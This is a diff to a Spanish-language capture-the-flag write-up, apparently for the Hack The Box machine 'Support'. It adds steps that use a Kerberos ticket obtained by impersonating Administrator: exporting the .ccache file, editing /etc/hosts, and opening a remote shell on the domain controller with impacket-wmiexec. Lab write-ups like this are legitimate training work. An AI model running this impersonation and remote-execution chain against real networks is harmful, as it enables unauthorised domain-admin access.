@@ -330,4 +330,16 @@ Hacemos la impersonacion usando [[IMPACKET]]
 impacket-getST -spn cifs/dc.support.htb -impersonate Administrator -dc-ip 10.129.230.181 support.htb/SERVICEA:123456
 ```
 
+Se nos genera un archivo `.ccache` y nos conectamos a la maquina usando [[IMPACKET]] usando el archivo, teniendo que exportar primero el archivo a una variable
+```shell
+export KRB5CCNAME=Administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache 
+```
+
+Añadiendo al `/etc/hosts` el nombre `dc.support.htb`
+
+Y conectandonos con [[IMPACKET]]
+```shell
+impacket-wmiexec dc.support.htb -k
+```
+
 
